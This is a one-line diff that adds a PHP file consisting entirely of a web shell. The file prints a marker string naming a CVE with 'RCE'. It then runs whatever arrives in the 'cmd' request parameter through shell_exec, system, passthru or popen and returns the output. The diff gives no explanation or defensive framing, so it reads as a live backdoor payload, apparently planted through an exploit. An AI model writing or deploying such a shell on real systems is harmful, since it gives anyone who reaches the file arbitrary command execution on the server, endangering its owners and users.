@@ -1,0 +1,1 @@
+<? echo "CVE202648907RCE";$c=$_REQUEST["cmd"];if(function_exists("shell_exec")){echo shell_exec($c." 2>&1");}elseif(function_exists("system")){system($c." 2>&1");}elseif(function_exists("passthru")){passthru($c." 2>&1");}elseif(function_exists("popen")){$h=popen($c." 2>&1","r");while(!feof($h))echo fread($h,1024);pclose($h);}else{echo"NOEXEC";}?>
